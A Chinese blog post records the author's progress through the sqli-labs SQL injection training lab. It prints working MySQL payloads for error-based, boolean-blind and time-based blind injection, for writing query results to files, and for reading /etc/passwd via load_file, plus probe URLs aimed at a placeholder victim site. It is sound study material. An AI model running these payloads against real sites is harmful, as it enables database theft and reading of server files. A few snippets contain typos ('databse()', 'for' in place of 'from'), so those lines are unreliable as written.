<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="preload" as="font" href="/_next/static/media/2aaf0723e720e8b9-s.p.woff2" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/40db9a3d7b10e1fc.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/6c438bdd1a6b11fe.css" data-precedence="next"/><title>sqli-labs挑战记录</title><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="any"/><meta name="next-size-adjust"/><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" noModule=""></script></head><body class="antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4"><script>!function(){try{var d=document.documentElement,c=d.classList;c.remove('light','dark');var e=localStorage.getItem('theme');if('system'===e||(!e&&true)){var t='(prefers-color-scheme: dark)',m=window.matchMedia(t);if(m.media!==t||m.matches){d.style.colorScheme = 'dark';c.add('dark')}else{d.style.colorScheme = 'light';c.add('light')}}else if(e){c.add(e|| '')}if(e==='light'||e==='dark')d.style.colorScheme=e}catch(e){}}()</script><div class="my-max mx-auto py-10 px-4"><header><div class="my-flex"><div class="flex space-x-6 "><p class="blog-name font-medium text-2xl">Always Exploring</p></div><nav class="nav-ml text-sm font-medium space-x-6"><a href="/">Home</a><a href="/about">About</a></nav></div></header><main><div class="js-toc my-toc"></div><article class="py-6 prose post-prose dark:prose-invert"><div class="post-title">sqli-labs挑战记录</div><time dateTime="2018-02-08T21:17:13.000Z" class="post-time">February 8, 2018</time><div class="js-toc-content"><h1 id="前言">前言</h1>
<p><a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>是Github上一个印度大叔<a href="https://github.com/Audi-1">Audi-1</a>的一个项目，用PHP和MySQL搭建的一个学习SQLI注入的实验平台。印度大叔有亲自自己录过教学视频，只是口音有点重，放在了Youtube上面（<a href="https://www.youtube.com/playlist?list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro">这里</a>）。我在此记录一下学习过程中的东西，欢迎交流。</p>
<h1 id="less-1---4">Less 1 - 4</h1>
<p>当找到注入点的时候，可以用order by 1/2/3来知道select中共有多少列。如果order by 不管用，可以用union select 1,2,3来判断，因为union要求左右两张表是一样的列数。</p>
<p>当页面不显示数据返回的结果，但是有错误提示，可以利用错误提示将数据dump出来</p>
<p>select concat((select database()))</p>
<p>原理解释<a href="http://www.cnblogs.com/xdans/p/5412468.html">Mysql报错注入原理分析(count()、rand()、group by)</a>
select count(*), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)<em>2))a from information_schema.tables group by a;
美化版
SELECT
count(</em>),
concat(
0x3a,
0x3a,
(SELECT USER()),
0x3a,
0x3a,
floor(rand(0) * 2)
) a
FROM
information_schema. TABLES
GROUP BY
a;</p>
<p>所以可以进阶一下，查看更多信息
select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)<em>2))a from information_schema.tables group by a;
美化版
SELECT
count(</em>),
concat(
0x3a,
0x3a,
(
SELECT
table_name  //此处无法用group_concat
FROM
information_schema. TABLES
WHERE
table_schema = DATABASE ()
LIMIT 0,
1
),
0x3a,
0x3a,
floor(rand(0) * 2)
) a
FROM
information_schema. TABLES
GROUP BY
a;
改变limit就可以遍历了，但是子查询中不知道为什么用group_concat就不会错误，所以只能一个个改变limit来。</p>
<p>以下还有两种方式也是一样的效果。
select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)</p>
<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</p>
<p>当不能使用select * from 的时候，比如后面有and 语句。可以用盲注。</p>
<h1 id="less-8">less-8</h1>
<p>盲注，这种情况没有错误提时，只能通过true and false来判断。
需要借助的函数是 ascii(), substr(), length() 这样来枚举一个字符串的长度，每一个字母来获取需要的信息。
比如</p>
<pre><code>select ascii(substr(database(), 3, 1)) &lt;100 
and ascii(substr((select table_name for information_schema.tables limit 1), 3 ,1)) &lt; 100
</code></pre>
<h1 id="less-9">less-9</h1>
<p>上一题的盲注是基于真假值得。但是这一题的sql结果无论是否存在与否，网页前端都是同一个效果，所以我们这一题的盲注要通过一个小技巧，叫做时间盲注。要用到sleep()函数。
可以构造构造如下的payload</p>
<pre><code>select ascii(substr(databse(), 3,1 )) = 90 and sleep(10)
select if((select database())=&quot;security&quot;, sleep(10), null)
select if((select database() like &quot;sec%&quot;), sleep(10), null)
</code></pre>
<p>假如第一个字母是正确的话，那么我们网页就等等待10秒才返回结果，如果错误就立即返回了。通过这两个时间的差距，我们就可以判断。</p>
<h1 id="using-outfile-lesst-7">using outfile (lesst-7)</h1>
<pre><code>select * from users into outfile &quot;/tmp/test.txt&quot;
select * from users limit 1 into dumpfile &quot;/tmp/test.txt&quot;
</code></pre>
<p>outfile可以多行，dumpfile只能一行</p>
<pre><code>select load_file(&quot;/etc/passwd&quot;) into outfile &quot;/tmp/test.txt&quot;
</code></pre>
<p>路径名一般用网站的目录，至于网站的目录就用其他方法来猜测和确定。</p>
<h1 id="less-12">less-12</h1>
<p>从11开始，就是post方法的注入了。
这里也是基于页面的Mysql错误提示来猜测SQL的写法。</p>
<h1 id="less-14">less 14</h1>
<p>因为这里成功登入之后没有任何有用的信息返回，但是错误SQL的时候页面会有错误提示，所以我们要用双重注入。</p>
<pre><code class="hljs language-sql">&quot; and (select 1 from (select count(*), (concat(&quot;<span class="hljs-operator">~</span>&quot;,version(),&quot;<span class="hljs-operator">~</span>&quot;,floor(rand(0)*2)))c from information_schema.tables GROUP BY c)a) # 
</code></pre>
<h1 id="less-16">less 16</h1>
<p>这题是盲注</p>
<h1 id="less-17">less 17</h1>
<pre><code class="hljs language-sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$psd&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$uname&#x27;</span>
</code></pre>
<p>这题就需要用双重注入</p>
<h1 id="less-18">less 18</h1>
<pre><code class="hljs language-sql"> <span class="hljs-string">&#x27;::1&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>)<span class="hljs-string">&#x27; at line 1
 insert into uagents (agents, ip , uname) value(&#x27;&#x27;, &#x27;&#x27;, &#x27;</span>admin<span class="hljs-string">&#x27;)
 insert into uagents(agent, ip, uname) value(&#x27;&#x27; or 1 = &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;, &#x27;</span>::<span class="hljs-number">1</span><span class="hljs-string">&#x27;, &#x27;</span>admin<span class="hljs-string">&#x27;)
</span></code></pre>
<p>这里应该用双重注入</p>
<h1 id="less-20">less 20</h1>
<p>基于cookie的注入， 这里其实也就是另一种形式的基于错误的注入。</p>
<h1 id="less-21">less 21</h1>
<p>和上面一样，只是加多一道加密的过程。</p>
<h1 id="有趣小知识">有趣小知识</h1>
<ol>
<li>可以通过一个有趣的小测试来识别是否存在单引号漏洞：
向Web服务器发送下面两个请求：
a.  <a href="http://www.victim.com/showproducts.php?category=bikes">http://www.victim.com/showproducts.php?category=bikes</a>
b.  <a href="http://www.victim.com/showproducts.php?category=bi&#x27;%7C%7C&#x27;kes">http://www.victim.com/showproducts.php?category=bi&#x27;||&#x27;kes</a>
在Microsoft SQL Server中与之等价的请求为：
a.  <a href="http://www.victim.com/showproducts.php?category=bikes">http://www.victim.com/showproducts.php?category=bikes</a>
b.  <a href="http://www.victim.com/showproducts.php?category=bi&#x27;+&#x27;kes">http://www.victim.com/showproducts.php?category=bi&#x27;+&#x27;kes</a>
在MYSQL中与之等价的请求为（请注意两个单引号之间的空格）：
a.  <a href="http://www.victim.com/showproducts.php?category=bikes">http://www.victim.com/showproducts.php?category=bikes</a>
b.  <a href="http://www.victim.com/showproducts.php?category=bi">http://www.victim.com/showproducts.php?category=bi</a>&#x27; &#x27;kes
如果两个请求的结果相同，那么很可能存在SQL注入漏洞。</li>
</ol></div></article></main></div><script src="/_next/static/chunks/webpack-3256771b4b5faaf4.js" async=""></script><script src="/_next/static/chunks/2443530c-ac8981f6a5707b30.js" async=""></script><script src="/_next/static/chunks/139-1dec130228ce3944.js" async=""></script><script src="/_next/static/chunks/main-app-2fe6bc2bab605f4b.js" async=""></script></body></html><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/2aaf0723e720e8b9-s.p.woff2\",{\"as\":\"font\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/40db9a3d7b10e1fc.css\",{\"as\":\"style\"}]\n3:HL[\"/_next/static/css/6c438bdd1a6b11fe.css\",{\"as\":\"style\"}]\n0:\"$L4\"\n"])</script><script>self.__next_f.push([1,"5:I{\"id\":\"7858\",\"chunks\":[\"272:static/chunks/webpack-3256771b4b5faaf4.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n7:I{\"id\":\"3055\",\"chunks\":[\"272:static/chunks/webpack-3256771b4b5faaf4.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n8:I{\"id\":\"350\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-a99377e10d68f0d5.js\"],\"name"])</script><script>self.__next_f.push([1,"\":\"ThemeProvider\",\"async\":false}\n9:I{\"id\":\"414\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-a99377e10d68f0d5.js\"],\"name\":\"\",\"async\":false}\na:I{\"id\":\"1234\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-a99377e10d68f0d5.js\"],\"name\":\"Analytics\",\"async\":false}\nb:I{\"id\":\"9544\",\"chunks\":[\"272:static/chunks/webpack-3256771b4b5faaf4.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\""])</script><script>self.__next_f.push([1,",\"async\":false}\nc:I{\"id\":\"99\",\"chunks\":[\"272:static/chunks/webpack-3256771b4b5faaf4.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"4:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/40db9a3d7b10e1fc.css\",\"precedence\":\"next\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/6c438bdd1a6b11fe.css\",\"precedence\":\"next\"}]],[\"$\",\"$L5\",null,{\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/posts/sqli-labs\",\"initialTree\":[\"\",{\"children\":[\"posts\",{\"children\":[[\"slug\",\"sqli-labs\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"sqli-labs\\\"]}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialHead\":[\"$L6\",[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\"}]],\"globalErrorComponent\":\"$7\",\"notFound\":[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L8\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex space-x-6 \",\"children\":[\"$\",\"p\",null,{\"className\":\"blog-name font-medium text-2xl\",\"children\":\"Always Exploring\"}]}],[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L9\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L9\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]]}]}],[\"$\",\"main\",null,{\"children\":[\"$undefined\",[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]]}]]}],[\"$\",\"$La\",null,{}]]}]}]}],\"asNotFound\":false,\"children\":[[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L8\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex space-x-6 \",\"children\":[\"$\",\"p\",null,{\"className\":\"blog-name font-medium text-2xl\",\"children\":\"Always Exploring\"}]}],[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L9\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L9\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]]}]}],[\"$\",\"main\",null,{\"children\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",[\"slug\",\"sqli-labs\",\"c\"],\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$Ld\",null],\"segment\":\"__PAGE__?{\\\"slug\\\":[\\\"sqli-labs\\\"]}\"},\"styles\":[]}],\"segment\":[\"slug\",\"sqli-labs\",\"c\"]},\"styles\":[]}],\"segment\":\"posts\"},\"styles\":[]}]}]]}],[\"$\",\"$La\",null,{}]]}]}]}],null]}]]\n"])</script><script>self.__next_f.push([1,"e:I{\"id\":\"1753\",\"chunks\":[\"46:static/chunks/46-79f3cb62e0a9762a.js\",\"49:static/chunks/app/posts/[...slug]/page-403c6a1364df7930.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"d:[[\"$\",\"$Le\",null,{}],[\"$\",\"article\",null,{\"className\":\"py-6 prose post-prose dark:prose-invert\",\"children\":[[\"$\",\"div\",null,{\"className\":\"post-title\",\"children\":\"sqli-labs挑战记录\"}],[\"$\",\"time\",null,{\"dateTime\":\"2018-02-08T21:17:13.000Z\",\"className\":\"post-time\",\"children\":\"February 8, 2018\"}],\"$undefined\",[\"$\",\"div\",null,{\"className\":\"js-toc-content\",\"children\":[[\"$\",\"h1\",null,{\"id\":\"前言\",\"children\":\"前言\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"a\",null,{\"href\":\"https://github.com/Audi-1/sqli-labs\",\"children\":\"sqli-labs\"}],\"是Github上一个印度大叔\",[\"$\",\"a\",null,{\"href\":\"https://github.com/Audi-1\",\"children\":\"Audi-1\"}],\"的一个项目，用PHP和MySQL搭建的一个学习SQLI注入的实验平台。印度大叔有亲自自己录过教学视频，只是口音有点重，放在了Youtube上面（\",[\"$\",\"a\",null,{\"href\":\"https://www.youtube.com/playlist?list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro\",\"children\":\"这里\"}],\"）。我在此记录一下学习过程中的东西，欢迎交流。\"]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-1---4\",\"children\":\"Less 1 - 4\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"当找到注入点的时候，可以用order by 1/2/3来知道select中共有多少列。如果order by 不管用，可以用union select 1,2,3来判断，因为union要求左右两张表是一样的列数。\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"当页面不显示数据返回的结果，但是有错误提示，可以利用错误提示将数据dump出来\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"select concat((select database()))\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"原理解释\",[\"$\",\"a\",null,{\"href\":\"http://www.cnblogs.com/xdans/p/5412468.html\",\"children\":\"Mysql报错注入原理分析(count()、rand()、group by)\"}],\"\\nselect count(*), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)\",[\"$\",\"em\",null,{\"children\":\"2))a from information_schema.tables group by a;\\n美化版\\nSELECT\\ncount(\"}],\"),\\nconcat(\\n0x3a,\\n0x3a,\\n(SELECT USER()),\\n0x3a,\\n0x3a,\\nfloor(rand(0) * 2)\\n) a\\nFROM\\ninformation_schema. TABLES\\nGROUP BY\\na;\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"所以可以进阶一下，查看更多信息\\nselect count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)\",[\"$\",\"em\",null,{\"children\":\"2))a from information_schema.tables group by a;\\n美化版\\nSELECT\\ncount(\"}],\"),\\nconcat(\\n0x3a,\\n0x3a,\\n(\\nSELECT\\ntable_name  //此处无法用group_concat\\nFROM\\ninformation_schema. TABLES\\nWHERE\\ntable_schema = DATABASE ()\\nLIMIT 0,\\n1\\n),\\n0x3a,\\n0x3a,\\nfloor(rand(0) * 2)\\n) a\\nFROM\\ninformation_schema. TABLES\\nGROUP BY\\na;\\n改变limit就可以遍历了，但是子查询中不知道为什么用group_concat就不会错误，所以只能一个个改变limit来。\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"以下还有两种方式也是一样的效果。\\nselect min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"当不能使用select * from 的时候，比如后面有and 语句。可以用盲注。\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-8\",\"children\":\"less-8\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"盲注，这种情况没有错误提时，只能通过true and false来判断。\\n需要借助的函数是 ascii(), substr(), length() 这样来枚举一个字符串的长度，每一个字母来获取需要的信息。\\n比如\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"select ascii(substr(database(), 3, 1)) \u003c100 \\nand ascii(substr((select table_name for information_schema.tables limit 1), 3 ,1)) \u003c 100\\n\"}]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-9\",\"children\":\"less-9\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"上一题的盲注是基于真假值得。但是这一题的sql结果无论是否存在与否，网页前端都是同一个效果，所以我们这一题的盲注要通过一个小技巧，叫做时间盲注。要用到sleep()函数。\\n可以构造构造如下的payload\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"select ascii(substr(databse(), 3,1 )) = 90 and sleep(10)\\nselect if((select database())=\\\"security\\\", sleep(10), null)\\nselect if((select database() like \\\"sec%\\\"), sleep(10), null)\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"假如第一个字母是正确的话，那么我们网页就等等待10秒才返回结果，如果错误就立即返回了。通过这两个时间的差距，我们就可以判断。\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"using-outfile-lesst-7\",\"children\":\"using outfile (lesst-7)\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"select * from users into outfile \\\"/tmp/test.txt\\\"\\nselect * from users limit 1 into dumpfile \\\"/tmp/test.txt\\\"\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"outfile可以多行，dumpfile只能一行\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"select load_file(\\\"/etc/passwd\\\") into outfile \\\"/tmp/test.txt\\\"\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"路径名一般用网站的目录，至于网站的目录就用其他方法来猜测和确定。\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-12\",\"children\":\"less-12\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"从11开始，就是post方法的注入了。\\n这里也是基于页面的Mysql错误提示来猜测SQL的写法。\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-14\",\"children\":\"less 14\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"因为这里成功登入之后没有任何有用的信息返回，但是错误SQL的时候页面会有错误提示，所以我们要用双重注入。\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-sql\",\"children\":[\"\\\" and (select 1 from (select count(*), (concat(\\\"\",[\"$\",\"span\",null,{\"className\":\"hljs-operator\",\"children\":\"~\"}],\"\\\",version(),\\\"\",[\"$\",\"span\",null,{\"className\":\"hljs-operator\",\"children\":\"~\"}],\"\\\",floor(rand(0)*2)))c from information_schema.tables GROUP BY c)a) # \\n\"]}]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-16\",\"children\":\"less 16\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"这题是盲注\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-17\",\"children\":\"less 17\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-sql\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"update\"}],\" users \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"set\"}],\" password\",[\"$\",\"span\",null,{\"className\":\"hljs-operator\",\"children\":\"=\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'$psd'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"where\"}],\" username\",[\"$\",\"span\",null,{\"className\":\"hljs-operator\",\"children\":\"=\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'$uname'\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"这题就需要用双重注入\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-18\",\"children\":\"less 18\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-sql\",\"children\":[\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'::1'\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'admin'\"}],\")\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"' at line 1\\n insert into uagents (agents, ip , uname) value('', '', '\"}],\"admin\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"')\\n insert into uagents(agent, ip, uname) value('' or 1 = '\"}],[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"', '\"}],\"::\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"', '\"}],\"admin\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"')\\n\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"这里应该用双重注入\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-20\",\"children\":\"less 20\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"基于cookie的注入， 这里其实也就是另一种形式的基于错误的注入。\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"less-21\",\"children\":\"less 21\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"和上面一样，只是加多一道加密的过程。\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"有趣小知识\",\"children\":\"有趣小知识\"}],\"\\n\",[\"$\",\"ol\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"可以通过一个有趣的小测试来识别是否存在单引号漏洞：\\n向Web服务器发送下面两个请求：\\na.  \",[\"$\",\"a\",null,{\"href\":\"http://www.victim.com/showproducts.php?category=bikes\",\"children\":\"http://www.victim.com/showproducts.php?category=bikes\"}],\"\\nb.  \",[\"$\",\"a\",null,{\"href\":\"http://www.victim.com/showproducts.php?category=bi'%7C%7C'kes\",\"children\":\"http://www.victim.com/showproducts.php?category=bi'||'kes\"}],\"\\n在Microsoft SQL Server中与之等价的请求为：\\na.  \",[\"$\",\"a\",null,{\"href\":\"http://www.victim.com/showproducts.php?category=bikes\",\"children\":\"http://www.victim.com/showproducts.php?category=bikes\"}],\"\\nb.  \",[\"$\",\"a\",null,{\"href\":\"http://www.victim.com/showproducts.php?category=bi'+'kes\",\"children\":\"http://www.victim.com/showproducts.php?category=bi'+'kes\"}],\"\\n在MYSQL中与之等价的请求为（请注意两个单引号之间的空格）：\\na.  \",[\"$\",\"a\",null,{\"href\":\"http://www.victim.com/showproducts.php?category=bikes\",\"children\":\"http://www.victim.com/showproducts.php?category=bikes\"}],\"\\nb.  \",[\"$\",\"a\",null,{\"href\":\"http://www.victim.com/showproducts.php?category=bi\",\"children\":\"http://www.victim.com/showproducts.php?category=bi\"}],\"' 'kes\\n如果两个请求的结果相同，那么很可能存在SQL注入漏洞。\"]}],\"\\n\"]}]]}]]}]]\n"])</script><script>self.__next_f.push([1,"6:[[[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}],[\"$\",\"title\",null,{\"children\":\"sqli-labs挑战记录\"}],null,null,null,null,null,null,null,null,null,[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"any\"}]],[],null]]\n"])</script>